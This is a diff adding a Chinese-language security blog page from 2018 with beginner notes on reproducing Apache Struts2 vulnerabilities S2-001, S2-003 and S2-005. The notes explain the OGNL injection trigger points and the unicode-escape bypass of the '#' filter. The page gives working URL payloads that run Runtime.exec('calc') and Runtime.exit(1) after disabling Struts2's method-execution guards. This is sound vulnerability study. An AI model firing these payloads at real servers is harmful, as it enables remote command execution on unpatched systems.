@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>struts2系列——S2漏洞 | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="这个系列的漏洞分析已经有很多前辈做了详细的解释了，本文做个初学者的S2漏洞复现跟踪。 S2-001：struts2.0.9之前漏洞触发点在action和interceptor调用结束后，result之前，preresult时对表单做递归处理处。比如%{name}会调用name的value，导致执行%{payload}，调试参考： https://03i0.com/2018/04/08/S2-001">
+<meta property="og:type" content="article">
+<meta property="og:title" content="struts2系列——S2漏洞">
+<meta property="og:url" content="http://hebic.me/2018/05/10/struts2系列——S2漏洞/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="这个系列的漏洞分析已经有很多前辈做了详细的解释了，本文做个初学者的S2漏洞复现跟踪。 S2-001：struts2.0.9之前漏洞触发点在action和interceptor调用结束后，result之前，preresult时对表单做递归处理处。比如%{name}会调用name的value，导致执行%{payload}，调试参考： https://03i0.com/2018/04/08/S2-001">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-05-11T06:27:52.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="struts2系列——S2漏洞">
+<meta name="twitter:description" content="这个系列的漏洞分析已经有很多前辈做了详细的解释了，本文做个初学者的S2漏洞复现跟踪。 S2-001：struts2.0.9之前漏洞触发点在action和interceptor调用结束后，result之前，preresult时对表单做递归处理处。比如%{name}会调用name的value，导致执行%{payload}，调试参考： https://03i0.com/2018/04/08/S2-001">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-001：struts2-0-9之前"><span class="toc-text">S2-001：struts2.0.9之前</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-003：-struts2-0-12之前"><span class="toc-text">S2-003： struts2.0.12之前</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-005：struts2-2-1之前"><span class="toc-text">S2-005：struts2.2.1之前</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-struts2系列——S2漏洞" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">struts2系列——S2漏洞</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.05.10</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2018/05/10/struts2系列——S2漏洞/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>这个系列的漏洞分析已经有很多前辈做了详细的解释了，本文做个初学者的S2漏洞复现跟踪。</p>
+<h1 id="S2-001：struts2-0-9之前"><a href="#S2-001：struts2-0-9之前" class="headerlink" title="S2-001：struts2.0.9之前"></a>S2-001：struts2.0.9之前</h1><p>漏洞触发点在action和interceptor调用结束后，result之前，preresult时对表单做递归处理处。比如%{name}会调用name的value，导致执行%{payload}，调试参考： <a href="https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></p>
+<h1 id="S2-003：-struts2-0-12之前"><a href="#S2-003：-struts2-0-12之前" class="headerlink" title="S2-003： struts2.0.12之前"></a>S2-003： struts2.0.12之前</h1><p>漏洞触发点在parameterInterceptor，对传入数据进行处理时，将得到的数据传入OGNL表达式造成的命令执行。</p>
+<p>两种Payload（不止两种）：</p>
+<p>第一种：</p>
+<p>?’\u0023context[\’xwork.MethodAccessor.denyMethodExecution\’]\u003dfalse’(bla)(bla)&amp;’\u0023myret\<a href="mailto:u003d@java.lang.Runtime" target="_blank" rel="noopener">u003d@java.lang.Runtime</a>@getRuntime().exec(\’calc\’)’(bla)(bla)</p>
+<p>第二种：</p>
+<p>?(aaa)((‘\u0023context[\’xwork.MethodAccessor.denyMethodExecution\’]\u003d\u0023foo’)(\u0023foo\u003dnew%20java.lang.Boolean(“false”)))&amp;(asdf)((‘\u0023rt.exec(“calc”)’)(\u0023rt\<a href="mailto:u003d@java.lang.Runtime" target="_blank" rel="noopener">u003d@java.lang.Runtime</a>@getRuntime</p>
+<p>问题发生在XWork的parameterInterceptor中对url信息数据收集过程中。因此不只有Struts2受到波及。</p>
+<p>URL传参时虽然做了#的防御，但是可以通过unicode编码绕过。unicode编码可以被还原为原始字符是在java层面生效的，并非struts2的转换。</p>
+<h1 id="S2-005：struts2-2-1之前"><a href="#S2-005：struts2-2-1之前" class="headerlink" title="S2-005：struts2.2.1之前"></a>S2-005：struts2.2.1之前</h1><p>对S2-003防御的绕过。</p>
+<p>在这个版本的Struts2中，有两个防止方法执行的属性，allowStaticMethodAccess和xwork.MethodAccessor.denyMethodExecution防止用户执行静态方法。两个的区别是，前者是是一个context的属性，后者是valuehashmap中的一项。黑客可以通过修改这两个属性绕过从而执行s2-003的payload</p>
+<p>参考： <a href="http://wcf1987.iteye.com/blog/1420307" target="_blank" rel="noopener">http://wcf1987.iteye.com/blog/1420307</a></p>
+<p> payload：</p>
+<p><code>?(&#39;\u0023_memberAccess[\&#39;allowStaticMethodAccess\&#39;]&#39;)(meh)=true&amp;(aaa)((&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003d\u0023foo&#39;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#39;\u0023rt.exit(1)&#39;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</code></p>
+<p>其中分为三个部分：</p>
+<p>（1）<code>?(&#39;#_memberAccess[&#39;allowStaticMethodAccess&#39;]&#39;)(meh)=true</code></p>
+<p>（2）<code>&amp;(aaa)((&#39;#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=#foo&#39;)(#foo=new%20java.lang.Boolean(&quot;false&quot;)))</code></p>
+<p>（3）<code>&amp;(asdf)((&#39;#rt.exit(1)&#39;)([#rt=@java.lang.Runtime@getRuntime()))=1](mailto:%23rt=@java.lang.Runtime@getRuntime()))=1)</code></p>
+<p>对于奇怪的括号的解释：</p>
+<p>（1）（expression）（constant）=value会执行expression=value。</p>
+<p>（2）（constant）（（expression1）（expression2））会先执行expression2，然后再执行expression1。</p>
+<p>（3）expression= value(constant)(constant) 会执行expression=value</p>
+<p>来自 &lt;<a href="https://blog.csdn.net/u011721501/article/details/41626959" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/41626959</a>&gt; </p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/05/06/struts2系列——XWork/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2018/06/13/JWT安全问题/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2018/05/10/struts2系列——S2漏洞/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
